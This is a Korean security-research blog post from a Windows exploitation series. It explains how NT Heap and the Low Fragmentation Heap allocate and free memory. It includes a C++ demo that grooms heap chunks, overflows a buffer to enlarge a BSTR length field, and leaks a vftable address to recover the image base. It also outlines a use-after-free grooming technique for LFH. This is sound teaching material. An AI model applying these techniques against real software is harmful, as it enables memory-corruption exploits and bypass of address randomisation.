---
title: "[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)"
author: L0ch
tags: [L0ch, lfh, windows, heap, nt heap, research]
categories: [Research]
date: 2021-03-28 14:00:00
cc: true
index_img: 2021/03/28/l0ch/pwncoolsexy-part3/thumbnail.png
---

# 이전 시리즈 바로가기

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows](https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/)

[Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/)

---

안녕하세요! 지난 폰쿨섹시 시리즈에 이어 오늘도 윈도우에 고통받고 있는 L0ch입니다! 

시작하기 전에 근황 얘기를 조금 하자면 제 프로필 사진이 거지 같아졌습니다. 아니 비유가 아니라 말 그대로요... 

어느 날 idioth 팀장형(이라 쓰고 독재자라고 읽는다)이 급하게 부르길래 무슨 일인가 했더니

> "야 너 지금 프로필 사진 별로다 내가 새로 그려줄까?"
"ㄴㄴ 나 지금 마음에 드는데"
"내가 마음에 안 들어 기다려봐ㅋ"
(10분 뒤)

![pwncoolsexy-part3/Untitled.png](pwncoolsexy-part3/Untitled.png)

> "?" 
"ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ 이걸로 함 팀장 권한으로 의견은 안 받음 ㅅㄱ"
"tq"




팀장의 권력남용으로 제 의견은 단 1도 없이 프로필 사진을 변경당했어요. 마른하늘에 웬 날벼락이지 이게

알고 보니 저만 당한 게 아니었더라구요 ㅋ.ㅋ  이 형 우리 놀리려고 해킹하는 게 분명해..

![pwncoolsexy-part3/Untitled%201.png](pwncoolsexy-part3/Untitled%201.png)

> ㄹㅇ 똑같이 그려서 더 분하다

이렇게 또 팀장 죽창 1스택을 쌓으며 쓴 이번 글에서는 Part 2에서 소개한 구조체를 NT Heap이 어떻게 써먹으면서 Heap 메모리를 할당하고 해제하는지 알아보겠습니다.. 

# Allocate in NT Heap

Heap 메모리 할당 요청이 들어오면 NT Heap의 메모리 할당 동작은 `RtlpAllocateHeap`에서 요청 크기에 따라 다음과 같이 세 가지로 나뉩니다.

- Size ≤ 0x4000
- 0x4000 < Size ≤ 0xff000
- Size > 0xff000

`0xff000`은 `_Heap->VirtualMemoryThreshold << 4` 의 값이며 가상 메모리 할당 기준값입니다. 또한 LFH는 크기가 `0x4000` 이하인 chunk만 관리한다고 이전 글에서 언급했었죠? 그래서 Non-LFH와 LFH의 할당 방식의 차이는 크기가 `0x4000`일 때만 고려하면 됩니다.

## Size ≤ 0x4000

요청 크기가 `0x4000`보다 작으면 먼저 LFH가 활성화되어 있는지 검사한 뒤 활성화 여부에 따라 할당 방법을 결정합니다.

### LFH Disabled

1. LFH가 비활성화되어 있으면 [_HEAP->FrontEndHeapUsageData](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP)에 `0x21`을 더한 뒤, 해당 값이 `0xff00` 또는 `(& 0x1f)`결과가 `0x10` 보다 큰지 검사합니다.
    - 조건을 만족하면 LFH를 활성화해 다음 chunk부터는 LFH로 할당됩니다.
2. 먼저 [_HEAP_LIST_LOOKUP->ListHint](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP)에 요청된 크기의 chunk가 있는지 확인하고 적절한 크기의 ListHint가 있으면 chunk를 가져와 할당합니다.
3. 적절한 크기의 chunk가 없으면 요청된 크기보다 더 큰 크기의 ListHint에서 가져온 chunk를 분할하고, 분할하고 남은 chunk를 [FreeList](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY)에 삽입하고 ListHint에 넣습니다.
4. FreeList에 적절한 chunk가 없으면 `ExtendHeap`으로 Heap space를 확장해 chunk를 가져와 할당합니다.

### LFH Enabled

LFH가 활성화된 상태에서는 `RtlpLowFragHeapAllocFromContext` 함수에서 다음과 같은 과정으로 할당됩니다.

1. [_HEAP_LOCAL_SEGMENT_INFO->ActiveSubsegment](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO)가 가리키는 Subsegment의 depth를 확인해 할당 가능한 chunk가 있는지 보고, 없으면 [_HEAP_LOCAL_SEGMENT_INFO->CachedItems](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO) 에서 검색합니다.
2. `CachedItems`에서 검색한 경우 `ActiveSubsegment`를 `CachedItem`의 Subsegment로 바꿉니다.
3. `_HEAP_LOCAL_SEGMENT_INFO->ActiveSubsegment->AggregateExchg->Depth` 값을 1 감소합니다.
4. `0x0-0x7f` 사이의 랜덤 값들로 채워진 256 bytes 배열인 `RtlpLowFragHeapRandomData[x]` 에서 임의의 1 bytes 값을 읽어 Heap chunk의 인덱스로 사용합니다.
5. [_HEAP_USERDATA_HEADER->BusyBitmap](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER) 비트맵에서 읽어온 인덱스 위치에 chunk를 할당할 수 있는지 확인하고 할당합니다. 할당이 불가능하면 인접한 위치의 다른 index를 찾습니다.

## 0x4000 < Size ≤ 0xff000

LFH가 비활성화된 `0x4000` 이하 크기의 할당 프로세스와 동일합니다. 간단하죠? 

## Size > 0xff000

요청 사이즈가 `0xff000`보다 클 경우 `ZwAllocateVirtualMemory()`라는 가상 메모리 할당 함수를 사용해 메모리를 할당하며, 해당 chunk는 `_HEAP_ENTRY` 대신 `_HEAP_VIRTUAL_ALLOC_ENTRY` 구조체가 header가 됩니다. 

# Free in NT Heap

Free 할 때는 chunk 크기에 따라 두 가지로 나뉩니다.

- Size ≤ 0xff000
- Size > 0xff000

## Size ≤ 0xff000

먼저 [_HEAP_ENTRY->UnusedBytes](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY) 에서 해당 chunk가 LFH로 관리되고 있는지 확인합니다.

### LFH Disabled

1. [_HEAP->FrontEndHeapUsageData](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY) 값을 1 감소시킵니다.
2. 이전 혹은 다음 chunk가 free 된 상태면 free 할 해당 chunk와 병합합니다.
3. 병합한 chunk를 [_HEAP_ENTRY->FreeList](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY)의 시작 혹은 끝에 삽입할 수 있는지 확인합니다.
4. 삽입 가능하면 [_HEAP_ENTRY->FreeList](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY)에, 아니라면 [_HEAP_LIST_LOOKUP->ListHint](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP)에 chunk를 삽입합니다.

### LFH Enabled

1. header를 디코딩해 [_HEAP_USERDATA_HEADER](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER) 와 [_HEAP_SUBSEGMENT](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER) 를 구합니다.
2. [_HEAP_ENTRY->UnusedBytes](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER) 값을 `0x80`으로 수정합니다.
    - `UnusedBytes`가 `0x80`이면 해제된 LFH chunk로 인식합니다.
3. chunk의 인덱스를 찾아 메모리 할당 비트맵인 [_HEAP_USERDATA_HEADER->BusyBitmap](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER)에 해제할 chunk에 해당하는 bit를 0으로 수정합니다.
4. [_HEAP_SUBSEGMENT->AggregateExchg](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT) 의 depth를 1 증가시킵니다.
5. 만약 해제된 chunk가 `ActiveSubsegment` 에 속하지 않은 경우 `CachedItem` 에 넣습니다.

## Size > 0xff000

1. 해제할 chunk를 [_HEAP->VirtualAllocdBlocks](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP) 에서 제거합니다.
2. `RtlSecMemFreeVirtualMemory` 함수를 사용해 할당 해제합니다.

복잡한 것처럼 보이지만, 사용하는 구조체 필드 설명을 보면서 이해하면 ~~그래도 복잡하지만~~ Heap 메모리를 어떻게 관리하는지 보입니다!

# NT Heap Exploitation

일반적인 Back-End exploitation과 LFH인 Front-End exploitation 두 가지로 나뉩니다. 

### Back-End Exploitation

LFH는 `0x4000` 이하 크기의 chunk가 18개 할당될 때부터 활성화된다는 [내용](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#Low-Fragmentation-Heap)이 part 2에서 나왔었죠? Back-End에서 취약점을 트리거하려면 LFH가 비활성화된 상태여야 하므로 chunk 할당을 18개 미만으로 제한해야 합니다. 보통 첫 번째(index 0)와 두 번째(index 1) 할당에도 chunk 간 거리가 크기 때문에 적합하지 않으니 우리가 접근하기 좋은 chunk의 index는 2 ~ 16 까지겠네요. 그 이후에는 일반적인 heap overflow로 chunk를 정렬하고 필요한 주소를 leak 하는 방법과 동일합니다.

예제코드로 확인해볼게요.

```cpp
#include <Windows.h>
#include <comdef.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <iostream>
using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

class SomeObject {
public:
    void function1() {};
    virtual void virtual_function1() {};
};

int main(int args, char** argv) {
    int i;
    BSTR bstr;
    HANDLE hChunk;
    void* allocations[ALLOC_COUNT];
    BSTR bStrings[5];
    SomeObject* object = new SomeObject();
    HANDLE defaultHeap = GetProcessHeap();

    printf("Default heap = 0x%08x\n", defaultHeap);

    for (i = 0; i < ALLOC_COUNT; i++) {
        hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
        memset(hChunk, 'A', CHUNK_SIZE);
        allocations[i] = hChunk;
        printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
    }

    printf("Freeing allocation at index 3: 0x%08x\n", allocations[3]);
    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
   

    for (i = 0; i < 5; i++) {
        bstr = SysAllocString(L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        bStrings[i] = bstr;
        printf("[%d] BSTR string : 0x%08x\n", i, bstr);
    }
    system("PAUSE");
    printf("Freeing allocation at index 4: 0x%08x\n", allocations[4]);
    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[4]);

    int objRef = (int)object;
    printf("SomeObject address for Chunk 3 : 0x%08x\n", objRef);
    vector<int> array1(40, objRef);
    vector<int> array2(40, objRef);
    vector<int> array3(40, objRef);
    vector<int> array4(40, objRef);
    vector<int> array5(40, objRef);
    vector<int> array6(40, objRef);
    vector<int> array7(40, objRef);
    vector<int> array8(40, objRef);
    vector<int> array9(40, objRef);
    vector<int> array10(40, objRef);
    printf("SomeObject array : 0x%08x\n", array1);
    printf("SomeObject array : 0x%08x\n", array2);
    printf("SomeObject array : 0x%08x\n", array3);
    printf("SomeObject array : 0x%08x\n", array4);
       
    system("PAUSE");
 
    UINT strSize = SysStringByteLen(bStrings[0]);
    printf("Original String size: %d\n", (int)strSize);
    printf("Overflowing allocation 2\n");

    char evilString[] =
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "CCCCDDDD"
        "\xff\x00\x00\x00";
    memcpy(allocations[2], evilString, sizeof(evilString));
    strSize = SysStringByteLen(bStrings[0]);
    printf("Modified String size: %d\n", (int)strSize);

    std::wstring ws(bStrings[0], strSize);
    std::wstring ref = ws.substr(120 + 16, 4);
    char buf[4];
    memcpy(buf, ref.data(), 4);
    int refAddr = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
    memcpy(buf, (void*)refAddr, 4);
    int vftable = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
    printf("Found vftable address : 0x%08x\n", vftable);

    system("PAUSE");

    return 0;

}
```

1. index 0~9까지 chunk 10개를 할당합니다. 
2. chunk[3]를 해제한 뒤 BSTR string을 할당합니다.
    - BSTR : `Header + String + NULL terminator` 형식의 자료형으로 각 문자는 2 bytes 크기를 가지며 헤더에 객체의 size가 저장됨
3. chunk[4]를 해제한 뒤 virtual function table pointer가 있는 `SomeObject` 객체 포인터 배열을 할당합니다.

![pwncoolsexy-part3/Untitled%202.png](pwncoolsexy-part3/Untitled%202.png)

```cpp
| CHUNK[0] | CHUNK[1] | CHUNK [2] | BSTR [0] | SomeObejct | CHUNK[5] | ...
```

실행결과에서 해제한 chunk[3]에 BSTR[0] 이, chunk[4]에는 SomeObject 포인터 배열이 할당된 것을 확인할 수 있습니다. 

![pwncoolsexy-part3/Untitled%203.png](pwncoolsexy-part3/Untitled%203.png)

메모리 덤프에서 봐도 예쁘게 잘 정렬됐네요~

heap overflow를 이용해 chunk[2]에서 BSTR 헤더의 length 필드의 값을 `F8` → `FF` 로 수정하면 다음 chunk의 데이터를 읽을 수 있습니다.

```cpp
... 
UINT strSize = SysStringByteLen(bStrings[0]);
printf("Original String size: %d\n", (int)strSize);
printf("Overflowing allocation 2\n");

char evilString[] =
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "BBBBBBBBBBBBBBBB"
        "CCCCDDDD"
        "\xff\x00\x00\x00";
memcpy(allocations[2], evilString, sizeof(evilString));
strSize = SysStringByteLen(bStrings[0]);
printf("Modified String size: %d\n", (int)strSize);
...
```

![pwncoolsexy-part3/Untitled%204.png](pwncoolsexy-part3/Untitled%204.png)

![pwncoolsexy-part3/Untitled%205.png](pwncoolsexy-part3/Untitled%205.png)

이제 vftable 주소를 읽는 것만 남았습니다.

```cpp
...
std::wstring ws(bStrings[0], strSize);
std::wstring ref = ws.substr(120 + 16, 4);
char buf[4];
memcpy(buf, ref.data(), 4);
int refAddr = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
memcpy(buf, (void*)refAddr, 4);
int vftable = int((unsigned char)(buf[3]) << 24 | (unsigned char)(buf[2]) << 16 | (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]));
printf("Found vftable address : 0x%08x\n", vftable);
...
```

![pwncoolsexy-part3/Untitled%206.png](pwncoolsexy-part3/Untitled%206.png)

vftable 주소의 offset은 고정이므로 offset을 구해두면 이후에 imagebase가 바뀌어도 vftable을 leak 한 뒤 offset을 빼 imagebase를 쉽게 구할 수 있습니다.

```cpp
Executable search path is: 
ModLoad: 002f0000 002f9000   C:\Users\dw0rdptr\source\repos\LFH\Release\LFH.exe
ModLoad: 77210000 773b2000   C:\WINDOWS\SYSTEM32\ntdll.dll
ModLoad: 75a80000 75b70000   C:\WINDOWS\System32\KERNEL32.DLL
```

현재 imagebase 가 `0x2f0000`이니까 offset은 `0x2f4690 - 0x2f0000 = 0x4690` 가 됩니다. 

![pwncoolsexy-part3/Untitled%207.png](pwncoolsexy-part3/Untitled%207.png)

제대로 구했네요! 이렇게 LFH가 활성화되지 않은 Heap은 chunk를 재활용하는 프로세스를 쉽게 이용할 수 있습니다.

## Front-End Exploitation

LFH는 다음 할당되는 chunk의 위치를 예측할 수 없도록 랜덤으로 할당해 heap overflow나 UAF 등의 취약점이 발생해도 heap을 제어하기 어렵도록 설계되었습니다.

그럼 LFH에서의 exploitation 목표는 `해제 후 재 할당되는 chunk의 위치를 예측 가능하게 하는 것` 이 되겠네요. 

A 객체를 해제하고 같은 크기의 B로 재 할당하는 UAF 시나리오를 가정해보겠습니다.

- A를 할당합니다.
- A와 같은 크기의 B를 [UserBlock](https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT)을 모두 채울때까지 할당합니다.

![pwncoolsexy-part3/Untitled%208.png](pwncoolsexy-part3/Untitled%208.png)

- A를 해제한 이후 B를 할당하면 `UserBlock`에는 해제한 A 공간밖에 남아있지 않아 해제된 A chunk에 할당하게 되고 UAF를 트리거할 수 있습니다.

![pwncoolsexy-part3/Untitled%209.png](pwncoolsexy-part3/Untitled%209.png)

다음 글에서는 HITCON CTF 2019 QUAL에서 출제된 문제인 dadadb를 풀어보면서 LFH의 reuse attack 이슈에 대해 자세히 알아보겠습니다! 

## Reference

[https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U](https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/?fbclid=IwAR0RI5JuJ7gdFsA_Twju0tW2IdwPUFNppmUcyu7dz_wuqeR3Lq3lWUa8q8U)

https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-english-version